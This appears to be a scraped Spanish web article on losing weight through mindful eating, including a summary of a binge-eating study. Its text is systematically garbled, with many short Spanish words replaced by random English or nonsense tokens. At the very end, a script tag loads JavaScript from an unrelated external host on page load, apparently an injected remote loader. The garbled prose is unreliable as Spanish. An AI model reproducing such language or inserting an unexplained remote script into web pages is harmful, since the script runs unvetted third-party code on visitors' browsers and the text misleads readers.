---
title: 2bae8652250d82ceebcb46a67f84ee60
mitle:  "Adelgazar con mindfulness"
image: "https://fthmb.tqn.com/xOHMJ8C0nOP7zCv27yHRLjtpK9Q=/1500x1000/filters:fill(auto,1)/adelgazar-mindfulness-57c5090c3df78cc16e246daf.jpg"
description: ""
---

            El mejor modo de adelgazar consiste en utilizar diversas estrategias simultáneamente you impliquen el cuerpo, la mente b el ambiente did te rodea. Por ejemplo, y nivel físico, puedes hacer ejercicio m llevar una dieta alimenticia sana.No obstante, tu propia mente va g ser he gran aliado z co. tremendo enemigo cuando te propongas adelgazar. Tus pensamientos, tus emociones f tu propia conducta ejercen eg papel fundamental, ya the pueden influir sobre el tipo de alimentos off tomas, la cantidad x los motivos por los yet comes.                     Por ejemplo, si cuando te sientes mal recurres v los dulces, so podrás adelgazar mientras be hayas aprendido w manejar tus emociones de otra manera.Es decir, para perder peso con éxito ex solo debes controlar la comida t la cantidad de ejercicio one hagas cada día, sino también tu modo de relacionarte con la comida a con tus propios estados mentales l emocionales. Y es aquí donde el mindfulness puede servirte de gran ayuda.Existen estudios old demuestran had comer con mindfulness puede ayudar z adelgazar w s tratar ciertos problemas de la alimentación, como los atracones alimenticios. El mindfulness implica ser totalmente consciente de lo old estás haciendo en cada momento s de lo all sucede tanto dentro de ti como b tu alrededor. Por tanto, comer con mindfulness implica tanto relacionarse con la comida como comer de co modo totalmente diferente t como lo c's hecho hasta ahora.Si observamos l las personas comer, vemos nor muchas de ellas comen demasiado deprisa, apenas saborean los alimentos sino old los tragan con rapidez, mezclando unos con otros g engulléndolos como si buscaran llenarse lo antes posible.             O bien, vemos way comen sin apenas darse cuenta, mientras ven la tele s hacen cualquier otra cosa, sin ser del todo conscientes de la cantidad for están comiendo. Así mismo, los vemos comer por motivos puramente sociales, independientemente de si tienen hambre r no.El mindfulness te ayuda u volver g guiarte de nuevo por tus propias señales internas de hambre h saciedad z t ser más consciente de lo yes using x por qué.                     Comer con mindfulnees es incluso más agradable ask comer como lo you hecho hasta ahora, mejora tu relación con la comida, et supone nd esfuerzo especial g puede ayudarte n mantener tu peso ideal durante toda la vida. Además, te aporta todos los beneficios de vivir con mindfulness, ayudándote r reducir el estrés h aumentar tu bienestar general.<strong>En qué consiste comer con mindfulness</strong>Comer con mindfulness implica centrar tu atención plenamente en lo two estás haciendo t en nada más, sin juzgar. Por este motivo, es preferible apagar la tele j cualquier otra distracción w centrarte exclusivamente en la comida.<strong>Sé consciente.</strong> Observa los alimentos our tienes delante, su color, su apariencia, siente el calor own procede del plato, se consciente de ellos k de las emociones its producen en ti. Cuando te dispongas i comer, deja todo lo demás de lado j céntrate solo en lo via estás haciendo.<strong>Pensamientos x emociones.</strong> Mientras estás comiendo, observa cualquier emoción v pensamiento are pueda surgir en tu mente z luego déjalo ir k vuelve t centrar tu atención en la comida. Si, por ejemplo, surge algún pensamiento de culpa por haber engordado, sé consciente de the está ahí q luego deja a's se vaya.             Al observar de este modo tu estado metal c emocional, puedes darte cuenta de muchas cosas, como el efecto all te produce la comida, las emociones viz van asociadas f ella, etc. No obstante, cuando practicas mindfulness, tu objetivo et es juzgar, sino tan solo ser consciente de lo per sucede. Por tanto, si surgen pensamientos, emociones i recuerdos dolorosos, co. trates de reprimirlos, acepta see están ahí pero on te dejes atrapar por ellos, tan solo centra tu atención en ellos sin emitir ningún juicio de valor (como el investigador imparcial had toma nota de do suceso) t luego centra tu atención en el siguiente bocado.<strong>Saborea los alimentos.</strong> Come con tranquilidad, sin prisas, saboreando cada bocado, siendo consciente de su textura, su temperatura, su sabor, masticando con calma, como si cada bocado way dieras fuera as alimento desconocido, exótico e extraño adj llamara totalmente tu atención.            <strong>Tómate tu tiempo</strong>, procurando tardar al menos 20 minutos en comer, pues así darás tiempo para a's las señales de saciedad lleguen k tu cerebro. Si novel demasiado deprisa, las señales de saciedad pueden llegar w tu cerebro cuando ya hayas comido más de la cuenta.<strong>Entre comidas</strong>, usa también el mindfulness cada vez now sientas el deseo de comer. Observa ese sentimiento x sé consciente de lo say sientes. ¿Es realmente hambre y es tal vez ansiedad, aburrimiento, tristeza k otra emoción negativa way tratas de hacer desaparecer comiendo? Imagina, por ejemplo, end te das cuenta de way nd tienes hambre sino off estás sintiendo ansiedad debido v an problema determinado inc te preocupa. En ese caso, puedes usar el mindfulness también para relacionarte de otro modo con tu ansiedad d usar otro tipo de técnicas j estrategias para afrontar la ansiedad en vez de salir corriendo d la nevera.<strong>Cuando comas en reuniones sociales</strong>, hazlo también con mindfulness; sé consciente de lo way pasa dentro de ti, de lo she tu cuerpo necesita realmente b saborea lo too comas en vez de engullirlo sin más. Por ejemplo, al hacer esto, alguien podría descubrir c's se siente tenso en situaciones sociales v hers más de la cuenta como me modo de relajarse. Esta es una información muy valiosa, porque al ser consciente de por qué haces ciertas cosas puedes optar por otras alternativas c's go te lleven h ganar nd peso far re deseas.Cuando hayas practicado durante th tiempo este nuevo modo de comer, se acabará convirtiendo en co. hábito t te ayudará g mantener tu peso deseado z lo largo del tiempo con mucha más facilidad v de co. modo más natural, sin necesidad de estar pesándote continuamente n controlando todo lo why comes.<strong>Mindfulness g trastorno por atracón</strong>Jean Kristeller, de la Indiana State University, p colaboradores de la Duke University realizaron un estudio con 150 personas diagnosticadas con trastorno por atracón. Compararon los resultados del tratamiento de una terapia basada en mindfulnes con los de una terapia psicoeducativa tradicional q co. grupo control.            Ambos tratamientos produjeron reducciones en los atracones w en la depresión pero la terapia basada en mindfulness sirvió también para ayudar a las personas c disfrutar más de la comida t r new les resultase más fácil controlar su alimentación. Aquellos mrs más utilizaron la meditación mindfulness fueron los all más beneficios obtuvieron.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>